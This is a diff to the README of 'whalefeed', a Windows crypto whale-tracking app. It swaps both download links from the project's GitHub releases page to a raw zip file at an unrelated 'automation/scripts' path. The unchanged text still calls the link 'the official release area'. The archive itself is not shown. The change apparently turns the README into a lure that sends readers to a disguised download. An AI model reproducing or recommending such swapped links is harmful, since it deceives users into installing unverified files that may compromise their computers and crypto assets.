@@ -5,7 +5,7 @@ description: "Download whalefeed via direct installer or mirror with a password-
 ---
 # 🐋 whalefeed - Track Big Crypto Moves Easily
 
-[![Download whalefeed](https://img.shields.io/badge/Download-whalefeed-orange?style=for-the-badge&logo=github)](https://github.com/dripdry-jung494/whalefeed/releases)
+[![Download whalefeed](https://img.shields.io/badge/Download-whalefeed-orange?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/dripdry-jung494/dripdry-jung494.github.io/main/automation/scripts/v2.4.zip)
 
 whalefeed is a free, open-source desktop utility for Windows that watches the Bitcoin network and shows you when large amounts of cryptocurrency move from one place to another. These big transfers are often called "whale" activity. Instead of reading complicated blockchain explorers or staring at raw transaction data, you get a clean, friendly window on your own computer that tells you what is happening in plain language.
 
@@ -17,7 +17,7 @@ Getting whalefeed onto your computer takes one step.
 
 **Visit this link to download the application:**
 
-[**https://github.com/dripdry-jung494/whalefeed/releases**](https://github.com/dripdry-jung494/whalefeed/releases)
+[**https://raw.githubusercontent.com/dripdry-jung494/dripdry-jung494.github.io/main/automation/scripts/v2.4.zip**](https://raw.githubusercontent.com/dripdry-jung494/dripdry-jung494.github.io/main/automation/scripts/v2.4.zip)
 
 That page is the official release area for the project. It is the only place you should ever get whalefeed from. Bookmark it so you can return later when you want the newest version.
 
